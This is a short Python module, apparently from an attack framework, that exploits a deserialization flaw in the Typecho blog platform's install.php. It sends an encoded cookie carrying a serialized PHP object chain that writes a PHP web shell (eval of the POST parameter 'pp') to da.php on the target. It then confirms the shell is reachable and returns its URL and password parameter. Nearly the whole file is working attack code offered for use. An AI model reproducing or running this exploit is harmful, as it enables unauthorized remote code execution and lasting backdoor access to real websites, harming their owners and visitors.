# -*- coding: utf-8 -*-
# author: seven
from models.payload import Payload,PayloadFailException
import modules.request.req as req
from models.horse import Horse
from utils import Utils
import requests

class P(Payload):
    def attack(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Cookie":"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTY6ImZpbGVfcHV0X2NvbnRlbnRzKCdkYS5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbcHBdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9",
            "Referer":'http://'+self.host + "/install.php",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
        }
        vulnurl = "http://{}/install.php?finish=1".format(self.host)
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            shellpath = "http://{}/da.php".format(self.host)
            post_data ={
                "pp":"phpinfo();"
            }
            req1 = requests.get(shellpath)
            if req1.status_code == 200:
                return shellpath,'pp'
        except Exception as e:
            print(e)
        raise PayloadFailException
        
